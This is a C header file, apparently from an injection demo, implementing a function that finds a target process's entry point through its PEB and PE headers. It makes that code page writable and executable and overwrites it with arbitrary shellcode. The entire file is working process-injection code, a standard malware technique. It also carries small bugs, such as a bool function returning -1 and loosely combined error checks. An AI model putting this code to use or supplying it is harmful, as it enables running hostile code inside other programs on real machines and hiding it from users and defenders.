#pragma once
#include <stdio.h>
#include "ntddk.h"

#define PAGE_SIZE 0x1000

void hex_dump(unsigned char *buf, size_t buf_size)
{
    size_t pad = 8;
    size_t col = 16;
    putchar('\n');
    for (size_t i = 0; i < buf_size; i++) {
        if (i != 0 && i % pad == 0) putchar('\t');
        if (i != 0 && i % col == 0) putchar('\n');
        printf("%02X ", buf[i]);
    }
    putchar('\n');
}

IMAGE_OPTIONAL_HEADER32 get_opt_hdr(unsigned char *read_proc)
{
    IMAGE_DOS_HEADER *idh = NULL;
    IMAGE_NT_HEADERS *inh = NULL;

    idh = (IMAGE_DOS_HEADER*)read_proc;
    inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
    return inh->OptionalHeader;
}

bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSize)
{
    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));

    PROCESSINFOCLASS pic;
    memset(&pic, 0, sizeof(PROCESSINFOCLASS));

    if (ZwQueryInformationProcess(hProcess, pic, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {
        printf("[ERROR] ZwQueryInformation failed\n");
        return (-1);
    }

    printf("PID = 0x%x\n", pbi.UniqueProcessId);

    LPCVOID ImageBase = 0;
    SIZE_T read_bytes = 0;
    if (!ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, sizeof(ImageBase), &read_bytes) && read_bytes != sizeof(ImageBase))
    {
        printf("[ERROR] ReadProcessMemory failed\n");
        return false;
    }
    printf("ImageBase = 0x%p\n", ImageBase);

    // read headers in order to find Entry Point:
    BYTE hdrs_buf[PAGE_SIZE];
    if (!ReadProcessMemory(hProcess, ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return (-1);
    }
    // verify read content:
    if (hdrs_buf[0] != 'M' || hdrs_buf[1] != 'Z') {
        printf("[-] MZ header check failed\n");
        return false;
    }

    // fetch Entry Point From headers
    IMAGE_OPTIONAL_HEADER32 opt_hdr = get_opt_hdr(hdrs_buf);
    DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
    printf("EP = 0x%x\n", ep_rva);

    //read code at OEP (this is just a test)
    unsigned char oep_buf[0x30];
    if (!ReadProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, oep_buf, sizeof(oep_buf), &read_bytes) && read_bytes != sizeof(oep_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return false;
    }

    printf("OEP dump:\n");
    hex_dump(oep_buf, sizeof(oep_buf));
    putchar('\n');

    //make a memory page containing Entry Point Writable:
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess,(BYTE*)ImageBase + ep_rva, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Virtual Protect Failed!\n");
        return false;
    }

    // paste the shellcode at Entry Point:
    if (!WriteProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, shellcode, shellcodeSize, &read_bytes))
    {
        printf("[-] WriteProcessMemory failed, err = %d\n", GetLastError());
        return false;
    }
    return true;
}